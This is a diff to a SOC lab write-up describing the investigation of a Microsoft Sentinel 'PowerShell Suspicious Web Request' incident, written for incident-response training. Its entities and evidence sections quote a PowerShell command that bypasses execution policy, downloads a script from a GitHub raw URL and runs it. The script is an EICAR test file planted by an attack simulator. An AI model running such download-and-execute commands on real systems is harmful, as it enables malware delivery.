@@ -68,15 +68,20 @@ This resulted in a Sentinel incident titled: “PowerShell Suspicious Web Reques
 
 <img width="900" height="300" alt="image" src="https://github.com/user-attachments/assets/2f70f206-ea85-46b9-a449-08337c583431" />
 
+
+
 #### 🔥 Gather relevant evidence and assess impact 🔥 
   - In this case the actual script files would be evidence, but are not necessarily the threat. The threat would be how they got there in the first place, or why the user (or system            account) is downloading them and executing them.
   - In real life, this could have happened from accidentally downloading malware or installing a game or free software or any number of ways.
+
+
   
 #### ** Notes: For the lab, let’s pretend like I contacted the user and they said they recently installed a free software at the same time the events took place. (But the reality is in this case, the attack simulator downloaded the scripts and executed them.
 
 
 
 - #### 🔥  Entities (3)
+  
  - Device: soclab1
  - User: soclab1
  - "powershell.exe" -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.gitxxxusercontent.com/josxxxdakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/     eicar.ps1 -OutFile C:\programdata\eicar.ps1
@@ -84,6 +89,7 @@ This resulted in a Sentinel incident titled: “PowerShell Suspicious Web Reques
 
    
 #### 🔥 Investigation evidence:
+
 
 <img width="850" height="350" alt="image" src="https://github.com/user-attachments/assets/6e68b4ec-a2f0-4cf4-8b81-b497c58165e0" />
 
@@ -96,8 +102,10 @@ powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
 " was run on the device :Soclab1"
 
 
+
 The incident was triggered on one device  "Soclab" by one user account "Soclab1"
 PowerShell was used to download malicious script "eicar.ps1" from external URLs: https://raw.gxxxubusercontent[.]com/joshxxxdakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar[.]ps1
+
 
 
 #### 🔥 Execution Review
@@ -120,10 +128,12 @@ PowerShell was used to download malicious script "eicar.ps1" from external URLs:
   <img width="750" height="330" alt="image" src="https://github.com/user-attachments/assets/a0382c46-0950-46f5-8103-e620a8d685cf" />
 
 
+
 ### 🔥 Eradication
 
 - Anti-malware scan initiated from MDE
 - Downloaded scripts reviewed to determine execution status
+
 
 ### 🔥 Recovery
 
